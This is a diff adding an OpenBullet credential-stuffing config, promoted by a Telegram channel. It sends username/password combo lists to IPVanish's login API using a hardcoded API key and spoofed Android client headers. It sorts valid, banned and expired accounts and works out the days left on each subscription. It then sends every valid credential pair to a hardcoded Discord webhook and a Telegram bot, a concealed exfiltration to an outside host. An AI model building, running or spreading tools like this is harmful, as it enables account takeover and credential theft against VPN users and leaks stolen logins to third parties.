@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "IPVanish [API]  [ TG - @OpenbulletConfigsOfficial]",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-22T12:21:46.9049362-08:00",
+  "AdditionalInfo": "Temporarily Disabled accounts goes to CUSTOM. Join @OpenbulletConfigsOfficial [Telegram] For More Configs",
+  "Author": "@OpenbulletConfigsOfficial",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(x){var n=16*Math.random()|0;return("x"==x?n:3&n|8).toString(16)})}
+var UUID = uuidv4();
+END SCRIPT -> VARS "UUID"
+
+REQUEST POST "https://api.ipvanish.com/api/v3/login" 
+  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.3.10.82423b82423\",\"os\":\"22\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"<UUID>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "X-Client: ipvanish" 
+  HEADER "X-Client-Version: 1.2." 
+  HEADER "X-Platform: Android" 
+  HEADER "X-Platform-Version: 22" 
+  HEADER "Host: api.ipvanish.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/4.4.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username or password provided is incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "Too many failed attempts" 
+  KEYCHAIN Success AND 
+    KEY "\"account_type\":2" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"account_type\":3" 
+
+PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "END_UNIX_TIME" 
+
+FUNCTION CurrentUnixTime -> VAR "CURR_TIME" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<END_UNIX_TIME>" LessThan "<CURR_TIME>" 
+    KEY "<END_UNIX_TIME>" EqualTo "<CURR_TIME>" 
+  KEYCHAIN Success OR 
+    KEY "<END_UNIX_TIME>" GreaterThan "<CURR_TIME>" 
+
+FUNCTION Compute "(<END_UNIX_TIME>-<CURR_TIME>)/(60*60*24)" -> VAR "DAYS_LEFT" 
+
+FUNCTION Floor "<DAYS_LEFT>" -> CAP "DAYS_LEFT" 
+
+FUNCTION Constant "@OpenbulletConfigsOfficial [Telegram]" -> CAP "Config by " 
+
+REQUEST POST "https://discord.com/api/webhooks/780153192259780658/hSTulSYZh9OxF3msMXpB5N0HPOQ94kTYJjZgLgycyvLL5ChsLeG5z00uQqe6D4HsHb_A" 
+  CONTENT "{\"content\":\"IPVANISH D - <USER>:<PASS> /EXP<EXP> /DAYS LEFT-<DAYS_LEFT>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://api.telegram.org/bot1421505037:AAGqsey8rx0_2HaQYaWeUsw1q-mI9T8JmLo/SendMessage?chat_id=-452016922&text=IPVANISH%0A<USER>:<PASS> /EXP<EXP>/DAYS LEFT-<DAYS_LEFT>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
